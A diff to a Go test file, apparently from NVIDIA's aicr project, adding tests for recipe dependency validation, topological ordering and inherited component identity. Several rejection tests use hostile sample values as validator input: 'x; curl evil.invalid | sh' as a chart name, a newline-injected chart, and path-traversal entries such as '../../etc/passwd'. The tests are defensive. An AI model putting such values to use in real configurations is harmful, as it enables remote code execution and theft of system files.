@@ -43,6 +43,8 @@ import (
 	"testing"
 
 	"github.com/NVIDIA/aicr/pkg/errors"
+
+	"github.com/NVIDIA/aicr/pkg/errors/errorstest"
 )
 
 func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
@@ -100,7 +102,7 @@ func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
 				},
 			},
 			wantErr: true,
-			errMsg:  "references unknown dependency",
+			errMsg:  `component "gpu-operator" depends on "cert-manager", which is not present in this recipe`,
 		},
 		{
 			name: "self-dependency (cycle)",
@@ -110,7 +112,7 @@ func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
 				},
 			},
 			wantErr: true,
-			errMsg:  "circular dependency",
+			errMsg:  "circular dependencies exist",
 		},
 		{
 			name: "two-node cycle",
@@ -121,7 +123,7 @@ func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
 				},
 			},
 			wantErr: true,
-			errMsg:  "circular dependency",
+			errMsg:  "circular dependencies exist",
 		},
 		{
 			name: "three-node cycle",
@@ -133,7 +135,7 @@ func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
 				},
 			},
 			wantErr: true,
-			errMsg:  "circular dependency",
+			errMsg:  "circular dependencies exist",
 		},
 		{
 			name: "complex valid graph",
@@ -151,12 +153,151 @@ func TestRecipeMetadataSpecValidateDependencies(t *testing.T) {
 	})
 }
 
+func TestDependencyValidationConsistency(t *testing.T) {
+	t.Parallel()
+
+	const externalHint = "\n(a dependency provided outside the recipe must remain declared with enabled: false)"
+	const missingA = `component "a" depends on "phantom", which is not present in this recipe`
+	tests := []struct {
+		name string
+		refs []ComponentRef
+		want string
+	}{
+		{name: "empty graph"},
+		{
+			name: "missing dependency without a cycle",
+			refs: []ComponentRef{{Name: "a", DependencyRefs: []string{"phantom"}}},
+			want: missingA + externalHint,
+		},
+		{
+			name: "missing dependencies in recipe order",
+			refs: []ComponentRef{
+				{Name: "z", DependencyRefs: []string{"two", "one"}},
+				{Name: "a", DependencyRefs: []string{"phantom"}},
+			},
+			want: `component "z" depends on "two", which is not present in this recipe` + "\n" +
+				`component "z" depends on "one", which is not present in this recipe` + "\n" + missingA + externalHint,
+		},
+		{
+			name: "duplicate missing edges",
+			refs: []ComponentRef{{Name: "a", DependencyRefs: []string{"phantom", "phantom"}}},
+			want: missingA + externalHint,
+		},
+		{
+			name: "duplicate declarations do not repeat missing edges",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"phantom"}},
+				{Name: "a", DependencyRefs: []string{"phantom"}},
+			},
+			want: missingA + externalHint,
+		},
+		{
+			name: "cycle without missing dependencies",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"b"}},
+				{Name: "b", DependencyRefs: []string{"a"}},
+			},
+			want: "circular dependencies exist",
+		},
+		{
+			name: "cycle and missing dependency on separate components",
+			refs: []ComponentRef{
+				{Name: "b", DependencyRefs: []string{"c"}},
+				{Name: "c", DependencyRefs: []string{"b"}},
+				{Name: "a", DependencyRefs: []string{"phantom"}},
+			},
+			want: missingA + externalHint + "\ncircular dependencies exist",
+		},
+		{
+			name: "cycle and missing dependency on the same component",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"b", "phantom"}},
+				{Name: "b", DependencyRefs: []string{"a"}},
+			},
+			want: missingA + externalHint + "\ncircular dependencies exist",
+		},
+		{
+			name: "disabled component's missing dependency is ignored",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"phantom"}, Overrides: map[string]any{"enabled": false}},
+				{Name: "b", DependencyRefs: []string{"a"}},
+			},
+		},
+		{
+			name: "install gate satisfies external dependency",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"phantom"}, Overrides: map[string]any{"install": false}},
+				{Name: "b", DependencyRefs: []string{"a"}},
+			},
+		},
+		{
+			name: "disabled component breaks a cycle",
+			refs: []ComponentRef{
+				{Name: "a", DependencyRefs: []string{"b"}, Overrides: map[string]any{"enabled": false}},
+				{Name: "b", DependencyRefs: []string{"a"}},
+			},
+		},
+		{
+			name: "all components disabled",
+			refs: []ComponentRef{{Name: "a", DependencyRefs: []string{"phantom"}, Overrides: map[string]any{"enabled": false}}},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			spec := RecipeMetadataSpec{ComponentRefs: tt.refs}
+			checks := []struct {
+				name string
+				run  func() error
+			}{
+				{name: "ValidateDependencies", run: spec.ValidateDependencies},
+				{name: "TopologicalSort", run: func() error {
+					order, err := spec.TopologicalSort()
+					if err != nil && order != nil {
+						t.Error("invalid graph returned a partial deployment order")
+					}
+					return err
+				}},
+				{name: "TopologicalLevels", run: func() error {
+					levels, err := spec.TopologicalLevels()
+					if err != nil && levels != nil {
+						t.Error("invalid graph returned partial deployment levels")
+					}
+					return err
+				}},
+			}
+			for _, check := range checks {
+				t.Run(check.name, func(t *testing.T) {
+					err := check.run()
+					if tt.want == "" {
+						if err != nil {
+							t.Fatalf("unexpected error: %v", err)
+						}
+						return
+					}
+					if errorstest.ReportedCode(err) != errors.ErrCodeInvalidRequest {
+						t.Fatalf("error = %v, want ErrCodeInvalidRequest", err)
+					}
+					var structured *errors.StructuredError
+					if !stderrors.As(err, &structured) {
+						t.Fatalf("error = %v, want StructuredError", err)
+					}
+					if structured.Message != tt.want {
+						t.Errorf("message = %q, want %q", structured.Message, tt.want)
+					}
+				})
+			}
+		})
+	}
+}
+
 func TestRecipeMetadataSpecTopologicalSort(t *testing.T) {
 	tests := []struct {
 		name    string
 		spec    RecipeMetadataSpec
 		want    []string
 		wantErr bool
+		errMsg  string
 	}{
 		{
 			name: "no dependencies",
@@ -209,7 +350,7 @@ func TestRecipeMetadataSpecTopologicalSort(t *testing.T) {
 				ComponentRefs: []ComponentRef{
 					// cert-manager disabled (e.g. provided by the CSP); gpu-operator
 					// and nvsentinel still depend on it but must not deadlock or
-					// trigger a false circular-dependency error.
+					// report a missing dependency.
 					{Name: "cert-manager", Type: ComponentTypeHelm, Overrides: map[string]any{"enabled": false}},
 					{Name: "gpu-operator", Type: ComponentTypeHelm, DependencyRefs: []string{"cert-manager"}},
 					{Name: "nvsentinel", Type: ComponentTypeHelm, DependencyRefs: []string{"cert-manager", "gpu-operator"}},
@@ -218,7 +359,7 @@ func TestRecipeMetadataSpecTopologicalSort(t *testing.T) {
 			want: []string{"gpu-operator", "nvsentinel"},
 		},
 		{
-			name: "undeclared dependency still surfaces as cycle error",
+			name: "undeclared dependency surfaces as missing-dependency error",
 			// gpu-operator depends on cert-manager, which is neither declared
 			// nor disabled — it simply does not exist. This must remain an
 			// error: only declared-but-disabled edges are dropped, so the
@@ -229,6 +370,18 @@ func TestRecipeMetadataSpecTopologicalSort(t *testing.T) {
 				},
 			},
 			wantErr: true,
+			errMsg:  `component "gpu-operator" depends on "cert-manager", which is not present in this recipe`,
+		},
+		{
+			name: "cycle reports circular dependencies",
+			spec: RecipeMetadataSpec{
+				ComponentRefs: []ComponentRef{
+					{Name: "a", Type: ComponentTypeHelm, DependencyRefs: []string{"b"}},
+					{Name: "b", Type: ComponentTypeHelm, DependencyRefs: []string{"a"}},
+				},
+			},
+			wantErr: true,
+			errMsg:  "circular dependencies exist",
 		},
 	}
 
@@ -240,6 +393,12 @@ func TestRecipeMetadataSpecTopologicalSort(t *testing.T) {
 				return
 			}
 			if tt.wantErr {
+				if errorstest.ReportedCode(err) != errors.ErrCodeInvalidRequest {
+					t.Errorf("TopologicalSort() error = %v, want ErrCodeInvalidRequest", err)
+				}
+				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
+					t.Errorf("TopologicalSort() error = %v, want contains %q", err, tt.errMsg)
+				}
 				return
 			}
 			if len(got) != len(tt.want) {
@@ -440,17 +599,40 @@ func TestRecipeMetadataSpecTopologicalLevels(t *testing.T) {
 			errMsg:  "circular dependencies exist",
 		},
 		{
-			name: "missing dependency surfaces as cycle error",
-			// Matches TopologicalSort behavior: an undeclared dependency
-			// keeps the dependent's in-degree above zero indefinitely,
-			// indistinguishable from a cycle by this algorithm.
+			name: "missing dependency names the component and dependency",
 			spec: RecipeMetadataSpec{
 				ComponentRefs: []ComponentRef{
 					{Name: "a", Type: ComponentTypeHelm, DependencyRefs: []string{"phantom"}},
 				},
 			},
 			wantErr: true,
-			errMsg:  "circular dependencies exist",
+			errMsg:  `component "a" depends on "phantom", which is not present in this recipe`,
+		},
+		{
+			name: "every missing dependency reported in recipe order",
+			// Mirrors a recipe trimmed by hand: the kept components still
+			// declare edges to components that were removed.
+			spec: RecipeMetadataSpec{
+				ComponentRefs: []ComponentRef{
+					{Name: "cert-manager", Type: ComponentTypeHelm},
+					{Name: "gpu-operator", Type: ComponentTypeHelm, DependencyRefs: []string{"nfd", "cert-manager", "kube-prometheus-stack"}},
+				},
+			},
+			wantErr: true,
+			errMsg: `component "gpu-operator" depends on "nfd", which is not present in this recipe` + "\n" +
+				`component "gpu-operator" depends on "kube-prometheus-stack", which is not present in this recipe`,
+		},
+		{
+			name: "missing dependency of a disabled component is ignored",
+			// A disabled component is not deployed, so its edges are never
+			// part of the ordering graph.
+			spec: RecipeMetadataSpec{
+				ComponentRefs: []ComponentRef{
+					{Name: "a", Type: ComponentTypeHelm, DependencyRefs: []string{"phantom"}, Overrides: map[string]any{"enabled": false}},
+					{Name: "b", Type: ComponentTypeHelm},
+				},
+			},
+			want: [][]string{{"b"}},
 		},
 		{
 			name: "nil and empty DependencyRefs are equivalent",
@@ -2180,6 +2362,459 @@ func TestComponentRefApplyRegistryDefaults_ManifestFiles(t *testing.T) {
 	})
 }
 
+// TestApplyInheritedIdentity verifies that a prior recipe's resolved namespaces
+// survive re-resolution against a registry whose defaults have moved.
+func TestApplyInheritedIdentity(t *testing.T) {
+	tests := []struct {
+		name   string
+		refs   []ComponentRef
+		prior  []ComponentRef
+		wantNS map[string]string
+	}{
+		{
+			name:   "prior namespace wins over registry default",
+			refs:   []ComponentRef{{Name: "nodewright-operator", Namespace: "nodewright"}},
+			prior:  []ComponentRef{{Name: "nodewright-operator", Namespace: "skyhook"}},
+			wantNS: map[string]string{"nodewright-operator": "skyhook"},
+		},
+		{
+			name:   "empty prior namespace does not clobber the default",
+			refs:   []ComponentRef{{Name: "gpu-operator", Namespace: "gpu-operator"}},
+			prior:  []ComponentRef{{Name: "gpu-operator", Namespace: ""}},
+			wantNS: map[string]string{"gpu-operator": "gpu-operator"},
+		},
+		{
+			name:   "component absent from prior keeps the default",
+			refs:   []ComponentRef{{Name: "new-thing", Namespace: "new-thing"}},
+			prior:  []ComponentRef{{Name: "gpu-operator", Namespace: "gpu-operator"}},
+			wantNS: map[string]string{"new-thing": "new-thing"},
+		},
+		{
+			name:   "nil prior is a no-op",
+			refs:   []ComponentRef{{Name: "gpu-operator", Namespace: "gpu-operator"}},
+			prior:  nil,
+			wantNS: map[string]string{"gpu-operator": "gpu-operator"},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			refs := slices.Clone(tt.refs)
+			ApplyInheritedIdentity(refs, tt.prior)
+			for _, ref := range refs {
+				if got := ref.Namespace; got != tt.wantNS[ref.Name] {
+					t.Errorf("%s namespace = %q, want %q", ref.Name, got, tt.wantNS[ref.Name])
+				}
+			}
+		})
+	}
+}
+
+// TestApplyInheritedIdentityRegistryFields verifies that chart, source, path
+// and the manifest file set survive a registry whose defaults have moved, and
+// that configuration (version, tag) does not.
+func TestApplyInheritedIdentityRegistryFields(t *testing.T) {
+	tests := []struct {
+		name  string
+		ref   ComponentRef
+		prior ComponentRef
+		want  ComponentRef
+	}{
+		{
+			name: "helm chart and source are restored, version is not",
+			ref: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "new-chart",
+				Source: "https://new.example", Version: "2.0.0"},
+			prior: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "old-chart",
+				Source: "https://old.example", Version: "1.0.0"},
+			want: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "old-chart",
+				Source: "https://old.example", Version: "2.0.0"},
+		},
+		{
+			name:  "kustomize path is restored, tag is not",
+			ref:   ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/new", Tag: "v2"},
+			prior: ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/old", Tag: "v1"},
+			want:  ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/old", Tag: "v2"},
+		},
+		{
+			name:  "a dropped manifest file is restored",
+			ref:   ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml", "b.yaml"}},
+			want:  ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml", "b.yaml"}},
+		},
+		{
+			name:  "an empty prior manifest set keeps the default",
+			ref:   ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+		},
+		{
+			name:  "a dropped pre-manifest file is restored and an added one is left out",
+			ref:   ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "new.yaml"}},
+			prior: ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "b.yaml"}},
+			want:  ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "b.yaml"}},
+		},
+		{
+			name:  "an empty prior pre-manifest set keeps the default",
+			ref:   ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml"}},
+		},
+		{
+			name:  "empty prior chart, source and path do not clobber the defaults",
+			ref:   ComponentRef{Name: "c", Chart: "chart", Source: "https://x.example", Path: "p"},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", Chart: "chart", Source: "https://x.example", Path: "p"},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			refs := []ComponentRef{tt.ref}
+			if err := ApplyInheritedIdentity(refs, []ComponentRef{tt.prior}); err != nil {
+				t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+			}
+			if !reflect.DeepEqual(refs[0], tt.want) {
+				t.Errorf("ref = %+v, want %+v", refs[0], tt.want)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedNamespace(t *testing.T) {
+	tests := []struct {
+		name           string
+		kind           ComponentType
+		priorNamespace string
+		wantNamespace  string
+	}{
+		{"helm", ComponentTypeHelm, "legacy", "legacy"},
+		{"kustomize", ComponentTypeKustomize, "legacy", "legacy"},
+		{"empty prior namespace", ComponentTypeHelm, "", "current"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			current := ComponentRef{Name: "component", Type: tt.kind, Namespace: "current",
+				Chart: "new-chart", Source: "https://new.example", Path: "deploy/new", Version: "2.0.0", Tag: "v2",
+				ManifestFiles: []string{"a.yaml", "new.yaml"}, PreManifestFiles: []string{"pre-new.yaml"},
+				ValuesFile: "values.yaml", Overrides: map[string]any{"fullnameOverride": "new-name"},
+				HealthCheckAsserts: "metadata:\n  namespace: current\n"}
+			refs := []ComponentRef{current, {Name: "new-component", Namespace: "new-namespace"}}
+			prior := []ComponentRef{{Name: "component", Namespace: tt.priorNamespace,
+				Chart: "old-chart", Source: "https://old.example", Path: "deploy/old", Version: "1.0.0", Tag: "v1",
+				ManifestFiles: []string{"a.yaml"}, PreManifestFiles: []string{"pre-old.yaml"},
+				Overrides: map[string]any{"fullnameOverride": "old-name"}},
+				{Name: "removed-component", Namespace: "removed-namespace"}}
+			if err := ApplyInheritedIdentityWithMode(refs, prior, InheritNamespace); err != nil {
+				t.Fatal(err)
+			}
+			want := current
+			want.Namespace = tt.wantNamespace
+			if refs[0].Namespace != want.Namespace || !strings.Contains(refs[0].HealthCheckAsserts, "namespace: "+want.Namespace) {
+				t.Fatalf("namespace and health check were not rebound: %+v", refs[0])
+			}
+			refs[0].HealthCheckAsserts = current.HealthCheckAsserts
+			if !reflect.DeepEqual(refs[0], want) {
+				t.Errorf("namespace-only inheritance changed other fields: got %+v, want %+v", refs[0], want)
+			}
+			if len(refs) != 2 || refs[1].Namespace != "new-namespace" {
+				t.Errorf("inheritance changed component membership or new component defaults: %+v", refs)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedNamespaceValidation(t *testing.T) {
+	tests := []struct {
+		name        string
+		mode        InheritMode
+		prior       ComponentRef
+		brokenCheck bool
+		wantErr     bool
+	}{
+		{name: "ignores unselected identity", mode: InheritNamespace,
+			prior: ComponentRef{Chart: "bad chart", Source: "bad source", Path: "../bad", ManifestFiles: []string{"../bad"}}},
+		{name: "rejects selected namespace", mode: InheritNamespace, prior: ComponentRef{Namespace: "bad namespace"}, wantErr: true},
+		{name: "rejects invalid mode", mode: "namespaces", wantErr: true},
+		{name: "rejects empty mode", wantErr: true},
+		{name: "rejects broken health check", mode: InheritNamespace, brokenCheck: true, wantErr: true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			refs := []ComponentRef{{Name: "first", Namespace: "current"}, {Name: "second", Namespace: "current"}}
+			if tt.brokenCheck {
+				refs[1].HealthCheckAsserts = "[invalid"
+			}
+			before := slices.Clone(refs)
+			tt.prior.Name = "second"
+			if tt.prior.Namespace == "" {
+				tt.prior.Namespace = "legacy"
+			}
+			err := ApplyInheritedIdentityWithMode(refs,
+				[]ComponentRef{{Name: "first", Namespace: "legacy"}, tt.prior}, tt.mode)
+			if tt.wantErr {
+				if errorstest.ReportedCode(err) != errors.ErrCodeInvalidRequest {
+					t.Fatalf("error = %v, want INVALID_REQUEST", err)
+				}
+				if !reflect.DeepEqual(refs, before) {
+					t.Fatal("failed inheritance partially mutated the recipe")
+				}
+			} else if err != nil {
+				t.Fatal(err)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedIdentityManifestFilesDoNotAlias(t *testing.T) {
+	prior := []ComponentRef{{Name: "c", ManifestFiles: []string{"a.yaml"}, PreManifestFiles: []string{"pre.yaml"}}}
+	refs := []ComponentRef{{Name: "c"}}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+	}
+	refs[0].ManifestFiles[0] = "mutated.yaml"
+	if prior[0].ManifestFiles[0] != "a.yaml" {
+		t.Error("mutating the inherited set changed the prior recipe's slice")
+	}
+	refs[0].PreManifestFiles[0] = "mutated.yaml"
+	if prior[0].PreManifestFiles[0] != "pre.yaml" {
+		t.Error("mutating the inherited pre-manifest set changed the prior recipe's slice")
+	}
+}
+
+func TestApplyInheritedIdentityRejects(t *testing.T) {
+	tests := []struct {
+		name    string
+		refs    []ComponentRef
+		prior   ComponentRef
+		wantErr string
+	}{
+		{"chart with shell metacharacters", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "x; curl evil.invalid | sh"}, "valid chart name"},
+		{"chart with a newline", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "chart\nkind: evil"}, "valid chart name"},
+		{"chart with a path separator", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "repo/chart"}, "valid chart name"},
+		{"chart with uppercase and underscore", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "My_Chart"}, "valid chart name"},
+		{"source with whitespace", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Source: "https://x.example evil"}, "valid source"},
+		{"path escaping the source", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Path: "../../etc"}, "valid path"},
+		{"manifest file escaping the data root", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", ManifestFiles: []string{"../../etc/passwd"}}, "valid path"},
+		{"absolute manifest file", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", ManifestFiles: []string{"/etc/passwd"}}, "valid path"},
+		{"pre-manifest file escaping the data root", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", PreManifestFiles: []string{"../../etc/passwd"}}, "pre-manifest file"},
+		{"absolute pre-manifest file", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", PreManifestFiles: []string{"/etc/passwd"}}, "pre-manifest file"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ApplyInheritedIdentity(tt.refs, []ComponentRef{tt.prior})
+			if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
+				t.Errorf("error = %v, want it to contain %q", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedIdentityTypeFlipKeepsOnlyNamespace(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "new", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "new", Chart: "new-chart"},
+	}
+	prior := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart", Source: "https://old.example",
+			ManifestFiles: []string{"old.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	want := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "old", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want a type flip not to fail the other components", err)
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v, want %+v", refs, want)
+	}
+}
+
+func TestApplyInheritedIdentityLeavesRefsUnmodifiedOnError(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	want := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	prior := []ComponentRef{
+		{Name: "a", Namespace: "old-a", Chart: "old-a", ManifestFiles: []string{"old.yaml"}},
+		{Name: "b", Chart: "x; curl evil.invalid | sh"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err == nil {
+		t.Fatal("ApplyInheritedIdentity() error = nil, want a rejection of component b")
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v after a rejected artifact, want them unmodified: %+v", refs, want)
+	}
+}
+
+func TestApplyInheritedIdentityIgnoresInvalidUnmatchedPrior(t *testing.T) {
+	refs := []ComponentRef{{Name: "c", Namespace: "ns", Chart: "chart"}}
+	prior := []ComponentRef{{Name: "gone", Chart: "x; curl evil.invalid | sh"}}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want nil for a prior component absent from the recipe", err)
+	}
+	if refs[0].Namespace != "ns" || refs[0].Chart != "chart" {
+		t.Errorf("refs[0] = %+v, want defaults unchanged", refs[0])
+	}
+}
+
+// TestApplyInheritedIdentityRebindsHealthCheck pins the interaction between the
+// two halves of --inherit-from: a health check is static YAML naming wherever
+// the registry currently puts the component, so a preserved namespace that left
+// the assertions behind would fail validation against the very deployment
+// inheritance just kept in place.
+//
+// The kube-system assertion is the control. A check may legitimately assert
+// against a namespace the component does not live in, and those must survive.
+func TestApplyInheritedIdentityRebindsHealthCheck(t *testing.T) {
+	const check = `apiVersion: chainsaw.kyverno.io/v1alpha1
+kind: Test
+spec:
+  steps:
+    - name: validate-deployment-exists
+      try:
+        - assert:
+            resource:
+              apiVersion: apps/v1
+              kind: Deployment
+              metadata:
+                name: skyhook-operator-controller-manager
+                namespace: nodewright
+    - name: validate-unrelated-namespace
+      try:
+        - assert:
+            resource:
+              apiVersion: apps/v1
+              kind: DaemonSet
+              metadata:
+                name: kube-proxy
+                namespace: kube-system
+`
+
+	refs := []ComponentRef{{
+		Name:               "nodewright-operator",
+		Namespace:          "nodewright",
+		HealthCheckAsserts: check,
+	}}
+	prior := []ComponentRef{{Name: "nodewright-operator", Namespace: "skyhook"}}
+
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+	}
+	if got := refs[0].Namespace; got != "skyhook" {
+		t.Fatalf("namespace = %q, want skyhook", got)
+	}
+	if strings.Contains(refs[0].HealthCheckAsserts, "namespace: nodewright") {
+		t.Errorf("health check still asserts the registry namespace:\n%s", refs[0].HealthCheckAsserts)
+	}
+	if !strings.Contains(refs[0].HealthCheckAsserts, "namespace: skyhook") {
+		t.Errorf("health check does not assert the inherited namespace:\n%s", refs[0].HealthCheckAsserts)
+	}
+	if !strings.Contains(refs[0].HealthCheckAsserts, "namespace: kube-system") {
+		t.Errorf("unrelated namespace assertion was rewritten:\n%s", refs[0].HealthCheckAsserts)
+	}
+}
+
+// TestApplyInheritedIdentityRebindsEveryDocument pins that rebinding preserves
+// a multi-document health check. Nothing restricts the field to one document,
+// and decoding only the first would silently drop the rest on re-serialization,
+// leaving a check that passes without verifying what it claims to. The second
+// document also holds the only matching namespace, so a first-document-only
+// implementation would additionally fail to rebind at all.
+func TestApplyInheritedIdentityRebindsEveryDocument(t *testing.T) {
+	const check = `apiVersion: chainsaw.kyverno.io/v1alpha1
+kind: Test
+metadata:
+  name: first-doc
+spec:
+  steps:
+    - name: unrelated
+      try:
+        - assert:
+            resource:
+              kind: DaemonSet
+              metadata:
+                namespace: kube-system
+---
+apiVersion: chainsaw.kyverno.io/v1alpha1
+kind: Test
+metadata:
+  name: second-doc
+spec:
+  steps:
+    - name: operator
+      try:
+        - assert:
+            resource:
+              kind: Deployment
+              metadata:
+                namespace: nodewright
+`
+
+	refs := []ComponentRef{{
+		Name:               "nodewright-operator",
+		Namespace:          "nodewright",
+		HealthCheckAsserts: check,
+	}}
+	prior := []ComponentRef{{Name: "nodewright-operator", Namespace: "skyhook"}}
+
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+	}
+	got := refs[0].HealthCheckAsserts
+	if !strings.Contains(got, "first-doc") {
+		t.Errorf("the first document was dropped:\n%s", got)
+	}
+	if !strings.Contains(got, "second-doc") {
+		t.Errorf("the second document was dropped:\n%s", got)
+	}
+	if !strings.Contains(got, "namespace: skyhook") {
+		t.Errorf("the second document's namespace was not rebound:\n%s", got)
+	}
+	if !strings.Contains(got, "namespace: kube-system") {
+		t.Errorf("an unrelated namespace was rewritten:\n%s", got)
+	}
+}
+
+// TestApplyInheritedIdentityLeavesRefIntactOnRebindFailure pins the all-or-
+// nothing contract: a ref changes both its namespace and its health check, or
+// neither. Assigning the namespace first would leave the new value beside
+// assertions still naming the old one, and the "already inherited" guard would
+// then skip the ref on a retry, stranding the stale YAML permanently.
+func TestApplyInheritedIdentityLeavesRefIntactOnRebindFailure(t *testing.T) {
+	refs := []ComponentRef{{
+		Name:      "nodewright-operator",
+		Namespace: "nodewright",
+		// Not parseable as YAML, so rebinding cannot succeed.
+		HealthCheckAsserts: "spec:\n  steps:\n   - bad\n  indent: [oops\n",
+	}}
+	prior := []ComponentRef{{Name: "nodewright-operator", Namespace: "skyhook"}}
+
+	err := ApplyInheritedIdentity(refs, prior)
+	if err == nil {
+		t.Fatal("ApplyInheritedIdentity() = nil error, want a parse failure")
+	}
+	if got := refs[0].Namespace; got != "nodewright" {
+		t.Errorf("namespace = %q, want it left at nodewright: a failed rebind must not "+
+			"half-apply the inheritance", got)
+	}
+}
+
 // TestComponentRefMergeWithPath verifies that the Path field is correctly merged
 // when merging ComponentRefs (overlay into base).
 func TestComponentRefMergeWithPath(t *testing.T) {
@@ -2258,6 +2893,19 @@ func TestComponentRefMergeWithPath(t *testing.T) {
 	})
 }
 
+// tcpxoRequiredBuildOpts supplies the generation-time TCPXO interface mapping
+// when (and only when) the criteria select the h100 GKE kubeflow family — the
+// one recipe that ships torch-distributed-tcpxo and therefore fails closed
+// without the recorded mapping.
+func tcpxoRequiredBuildOpts(cr *Criteria) []BuildOption {
+	if cr.Service == CriteriaServiceGKE && cr.Accelerator == CriteriaAcceleratorH100 &&
+		cr.Platform == CriteriaPlatformKubeflow {
+
+		return []BuildOption{WithGKETCPXOInterfaces(tcpxoTestMapping())}
+	}
+	return nil
+}
+
 // TestNFDTopologyUpdater_OverlayCoverage verifies that every GPU overlay
 // rooted at a real-cluster platform base resolves to
 // componentRefs[nfd].overrides.topologyUpdater.enable=true, and that the
@@ -2309,6 +2957,8 @@ func TestNFDTopologyUpdater_OverlayCoverage(t *testing.T) {
 		{"rtx-pro-6000-lke-inference", criteria{CriteriaServiceLKE, CriteriaAcceleratorRTXPro6000, "", CriteriaIntentInference, ""}, true},
 		{"b200-gke-cos-training", criteria{CriteriaServiceGKE, CriteriaAcceleratorB200, CriteriaOSCOS, CriteriaIntentTraining, ""}, true},
 		{"b200-gke-cos-inference", criteria{CriteriaServiceGKE, CriteriaAcceleratorB200, CriteriaOSCOS, CriteriaIntentInference, ""}, true},
+		{"gb200-gke-cos-training", criteria{CriteriaServiceGKE, CriteriaAcceleratorGB200, CriteriaOSCOS, CriteriaIntentTraining, ""}, true},
+		{"gb200-gke-cos-inference", criteria{CriteriaServiceGKE, CriteriaAcceleratorGB200, CriteriaOSCOS, CriteriaIntentInference, ""}, true},
 		// Deeper specialized leaves — inherited via base: chain; a future overlay
 		// that replaces (rather than deep-merges) componentRefs would break these.
